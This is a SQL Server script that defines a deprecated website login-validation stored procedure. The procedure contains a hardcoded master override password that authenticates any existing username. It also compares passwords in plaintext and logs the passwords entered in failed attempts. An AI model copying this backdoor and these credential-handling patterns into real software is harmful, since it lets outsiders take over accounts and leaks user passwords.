USE [WebDev]
GO
/****** Object:  StoredProcedure [dbo].[spweb_loginValidate_deprecated]    Script Date: 12/22/2020 8:09:00 AM ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO



-- =============================================
-- Author:		B.Grant
-- Create date: 3/2012
-- Description:	test website login. formerly logintest
-- return loginid if user,pwd match; -1 if user only matches; -2 if neither; -4 if matched but inactive
-- =============================================
CREATE PROCEDURE [dbo].[spweb_loginValidate_deprecated]
	@user varchar(50),
	@password varchar(50)
AS
BEGIN
	SET NOCOUNT ON;
	DECLARE @retval int
	DECLARE @matchBoth int
	DECLARE @matchUserOnly int
	DECLARE @active int
	DECLARE @override varchar(15)
	set @override = 'bb4590452'
	
	--test user and password
	select top 1 @matchBoth = loginid, @active = active from userlogin 
		where (login=@user)
		and (password=@password)
		
	--test user only
	select top 1 @matchUserOnly = loginid from userlogin 
		where (login=@user)
		--and active=1
		
	select @retval = 
	case 
		when @matchBoth is not null then --@matchBoth
			case when @active=1 then @matchBoth else -4 end
		--else case when @matchUserOnly is not null then -1 else -2 end
		--replace with above line when testing complete to remove override:
		else case when @matchUserOnly is not null then 
			case when @password=@override then @matchUserOnly else -1 end	
			else -2 end			
	end
	SELECT @retval as retval
	if @retval>0
		begin
			insert into login_history (dt,username,password,login_type) 
				--values(getdate(),@user,@password,'login')	--changed 11/2015 to remove successful passwords
				values(getdate(),@user,null,'login')
		end
	else
		begin
			insert into login_history (dt,username,password,login_type) 
				values(getdate(),@user,@password,'failed')
		end
	RETURN @retval

END




GO
